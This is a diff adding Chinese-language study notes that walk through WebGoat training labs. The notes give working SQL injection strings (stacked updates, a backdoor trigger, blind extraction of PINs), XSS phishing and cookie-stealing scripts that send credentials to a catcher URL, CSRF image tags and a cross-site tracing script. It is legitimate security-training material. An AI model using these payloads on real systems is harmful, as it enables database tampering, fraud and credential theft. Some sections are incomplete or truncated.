@@ -105,6 +105,8 @@ SELECT * FROM user_data WHERE last_name = 'Erwon' or '1'='1'
 
 ## LAB: SQL Injcetion
 
+### stage1
+
 ~~~sql
 "SELECT * FROM employee WHERE userid = " + userId + " and password = " + password
 ~~~
@@ -114,6 +116,24 @@ SELECT * FROM user_data WHERE last_name = 'Erwon' or '1'='1'
 ~~~sql
 "SELECT * FROM employee WHERE userid = " + userId + " and password = " + password
 ~~~
+
+### stage2
+
+只对开发者版本有效，所以不用做。
+
+### stage3
+
+从员工Larry处获取boss的信息。
+
+~~~
+先在密码处输入
+s' or '1'='1
+
+再于viewfile输入(老板工资最高)
+101 or 1=1 order by salary desc
+~~~
+
+
 
 
 
@@ -141,7 +161,202 @@ bar';INSERT INTO salaries VALUES('goa',99999);--插入用户名为goa，薪资�
 
 使用SQL注入实现大于一条的SQL语句。
 
+~~~sql
+首先是输入userid，然后修改salary
+101;UPDATE employee SET salary=99999
+
+然后是添加触发器
+101;CREATE TRIGGER myBackDoor BEFORE INSERT ON employee FOR EACH ROW BEGIN UPDATE employee SET email='join@hackme.com'WHERE userid = NEW.userid
+~~~
+
+
+
+## Blind Numeric SQL Injection
+
+先输入101，发现合法。
+
+通过101 AND 1=1 和101 AND 1=2的原理进行判断，二分最终得到最后的值。
+
+~~~sql
+101 AND ((SELECT pin FROM pins WHERE cc_number='1111222233334444')<10000) #这里是整数范围
+~~~
+
+
+
+## Blind String SQL Injection
+
+~~~sql
+需要使用SUBSTRING(STRING, START,LENGTH)
+
+101 AND (SUBSTRING((SELECT name FROM pins WHERE cc_number='4321432143214321'), 1, 1) < 'H' );
+
+这样子能够找到第一个字符为J，依次找下去，找到了Jill
+~~~
+
+
+
 
 
 # XSS
+
+The user should be able to add a form asking for username and password. On submit the input should be sent to http://localhost/WebGoat/catcher?PROPERTY=yes&user=catchedUserName&password=catchedPasswordName
+
+使用XSS能够在已经存在的页面上增加额外的元素。
+
+
+
+## Phishing with XSS
+
+用XSS钓鱼，主要是使用XSS和HTML插入
+
+* 插入HTML需要身份验证的信息
+* 增加JavaScript来收集这些信息
+* 将这些信息post
+
+在search中输入增加用户名和密码的表格。格式如下
+
+~~~html
+</form><form name="phish"><br><br><HR><H3>This feature requires account login:</H3 ><br><br>Enter Username:<br><input type="text" name="user"><br>Enter Password:<br><input type="password" name = "pass"><br></form><br><br><HR>
+~~~
+
+然后添加JavaScript，这个js能够读取从表单输入的信息，并将信息发送给webgoat
+
+~~~javascript
+<script>function hack(){ XSSImage=new Image; XSSImage.src="http://localhost/WebGoat/catcher?PROPERTY=yes&user="+ document.phish.user.value + "&password=" + document.phish.pass.value + ""; alert("Had this been a real attack... Your credentials were just stolen. User Name = " + document.phish.user.value + "Password = " + document.phish.pass.value);} </script>
+~~~
+
+然后需要一个按钮
+
+~~~html
+<input type="submit" name="login" value="login" onclick="hack()">
+~~~
+
+最终的结果如下所示，也就是将JavaScript的内容放在form的开头，button的内容放在末尾。
+
+~~~html
+</form><script>function hack(){ XSSImage=new Image; XSSImage.src="http://localhost/WebGoat/catcher?PROPERTY=yes&user="+ document.phish.user.value + "&password=" + document.phish.pass.value + ""; alert("Had this been a real attack... Your credentials were just stolen. User Name = " + document.phish.user.value + "Password = " + document.phish.pass.value);} </script><form name="phish"><br><br><HR><H3>This feature requires account login:</H3 ><br><br>Enter Username:<br><input type="text" name="user"><br>Enter Password:<br><input type="password" name = "pass"><br><input type="submit" name="login" value="login" onclick="hack()"></form><br><br><HR>
+~~~
+
+## Lab:Cross Site Scripting
+
+
+
+### stage1
+
+先登录Tom的账户，选择editProfile，在street栏中输入
+
+~~~html
+<script>Alert('Got ya')</script>
+~~~
+
+再用另一账户，权限要高一些的，登录，查看Tom的账户，就会跳出这个alert。
+
+
+
+### stage5 
+
+执行reflected XSS 攻击
+
+利用search栏的漏洞创建一个包含危险攻击的URL，证实别的用户会被影响。
+
+在SearchStaff中输入
+
+~~~html
+<script>alert("Dangerous");</script>
+~~~
+
+
+
+## Stored XSS Attack
+
+增加信息，信息能够使别的用户加载一个不受欢迎的页面。
+
+在Message栏中写入
+
+~~~html
+<script language="javascript" type="text/javascript">alert("Ha Ha Ha");</script>
+~~~
+
+
+
+~~~html
+<script language="javascript" type="text/javascript">alert(document.cookie);</script>
+~~~
+
+
+
+## Reflected XSS Attack
+
+在某一栏中输入
+
+~~~html
+ <script>alert('Bang!')</script>
+~~~
+
+
+
+## Cross Site Request Forgery
+
+在title中命名为test，但是message命名为
+
+~~~html
+<img src="http://localhostattack?Screen=52&menu=900&transferFunds=5000" width="1" height="1" />
+~~~
+
+注意SRC的内容要根据具体的来
+
+
+
+## CSRF Prompt By-Pass
+
+在message框中输入
+
+~~~html
+<img src="?transferFunds=4000" />
+<img src="?transferFunds=CONFIRM" />
+~~~
+
+点击提交，刷新后就可以看到已经完成实验了
+
+
+
+## CSRF Token By-Pass
+
+首先需要在浏览器的URL栏中输入&transferFunds=main，就会跳转到另一个界面了。(这里其实就能完成实验了)
+
+然后查看页面的代码找到Token的位置
+
+~~~html
+<form accept-charset='UNKNOWN' id='transferForm' method='POST' action='attack?Screen=2&menu=900' enctype='application/x-www-form-urlencoded'>
+	<input name='transferFunds' type='text' value='0'>
+	<input name='CSRFToken' type='hidden' value='1745740650'>
+	<input type='submit'>
+</form>
+~~~
+
+回到首页
+
+~~~
+
+~~~
+
+
+
+## HTTPOnly Test
+
+检测浏览器是否支持HTTPOnly cookie
+
+选择readcookie，就会跳出
+
+主要看实验报告中的四张图
+
+
+
+## Cross Site Tracing(XST) Attacks
+
+通过插入
+
+~~~html
+<script type="text/javascript">if ( navigator.appName.indexOf("Microsoft") !=-1) {var xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");xmlHttp.open("TRACE", "./", false); xmlHttp.send();str1=xmlHttp.responseText; while (str1.indexOf("\n") > -1) str1 = str1.replace("\n","<br>"); document.write(str1);}</script>
+~~~
 
